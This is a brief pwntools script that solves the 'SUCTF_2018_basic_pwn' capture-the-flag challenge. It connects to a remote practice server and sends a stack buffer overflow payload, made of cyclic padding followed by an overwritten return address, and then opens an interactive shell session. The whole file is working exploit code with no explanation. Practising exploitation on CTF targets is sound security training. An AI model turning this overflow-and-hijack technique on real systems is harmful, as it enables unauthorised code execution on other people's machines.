from pwn import *
context.log_level = 'debug'

# io = process('./SUCTF_2018_basic_pwn')
io = remote('node4.buuoj.cn', 29234)
elf = ELF('./SUCTF_2018_basic_pwn')

io.sendline(cyclic(0x110 + 8) + p64(0x401157))

io.interactive()
